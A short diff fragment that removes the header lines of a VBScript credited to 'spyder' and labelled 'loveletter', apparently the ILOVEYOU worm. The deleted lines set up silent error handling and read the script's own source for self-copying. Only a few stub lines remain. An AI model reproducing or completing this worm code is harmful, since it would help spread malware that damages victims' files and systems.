@@ -1,12 +1,3 @@
-rem  barok -loveletter(vbe) <i hate go to school> 
- rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines 
- On Error Resume Next 
- dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
- eq="" 
- ctr=0 
- Set fso = CreateObject("Scripting.FileSystemObject")
- set file = fso.OpenTextFile(WScript.ScriptFullname,1)
- vbscopy=file.ReadAll 
  main() 
  sub main() 
  On Error Resume Next 
